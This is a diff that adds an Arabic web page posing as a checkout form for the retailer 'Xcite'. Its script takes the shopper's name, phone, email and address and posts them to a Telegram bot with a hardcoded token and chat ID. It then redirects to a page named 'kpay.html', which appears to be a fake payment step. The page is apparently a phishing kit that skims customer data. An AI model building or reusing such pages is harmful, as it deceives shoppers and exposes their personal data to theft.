@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>متجر إلكتروني</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="form1.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+ 
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo" id="loginot2">⬅︎</div>
+    <div class="search-bar">
+      <i class="fas fa-search"></i>
+      <input type="text" placeholder="Search Xcite">
+      <i class="fas fa-microphone"></i>
+    </div>
+  </div>
+
+  <div class="box-shadow">
+    <form>
+      <input type="text" name="name" placeholder="الاسم" required>
+      <input type="tel" name="phone" placeholder="رقم الهاتف" required>
+      <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+
+      <h3>عنوان التوصيل</h3>
+      <textarea name="address" id="adress" placeholder="عنوان التوصيل"  required></textarea>
+      <textarea name="address" id="adress" placeholder="المحافظة "  required></textarea>
+
+
+
+      <h3>موعد التوصيل</h3>
+      <select name="delivery_time" required>
+        <option value="">اختر موعد التوصيل</option>
+        <option value="صباحًا">صباحًا</option>
+        <option value="مساءً">مساءً</option>
+      </select>
+
+      <button type="submit">تأكيد العنوان </button>
+      <p id="texmom"> بعد تأكيد العنوان سيتم توجيهك الى الدفع </p>
+    </form>
+  </div>
+  
+
+  
+  <script>
+
+document.getElementById("loginot2").addEventListener("click", function() {
+    window.location.href = "index.html"; // ← اسم الصفحة التي تريد التوجيه إليها
+  });
+    const TOKEN = '7861011533:AAE-7AqO49Yawvk19U0Svs1uHSoVr1Wf8Wo'; // ضع توكن البوت هنا
+    const CHAT_ID = '7595871538'; // ضع معرف التليجرام هنا
+  
+    document.querySelector("form").addEventListener("submit", function(e) {
+      e.preventDefault(); // يمنع الإرسال العادي
+  
+      const name = this.name.value;
+      const phone = this.phone.value;
+      const email = this.email.value;
+      const address1 = this.address[0].value;
+      const address2 = this.address[1].value;
+      const deliveryTime = this.delivery_time.value;
+  
+      const message = `
+  📥   زبون جديد :
+  👤 الاسم: ${name}
+  📞 الهاتف: ${phone}
+  📧 البريد الإلكتروني: ${email}
+  📍 العنوان: ${address1}
+  🏙️ المحافظة: ${address2}
+  ⏰ موعد التوصيل: ${deliveryTime}
+      `;
+  
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          // يمكنك إعادة التوجيه بعد الإرسال:
+          window.location.href = "kpay.html"; // أو أي صفحة أخرى مثل success.html
+        } else {
+        }
+      });
+    });
+  </script>
+  
+</body>
+</html>
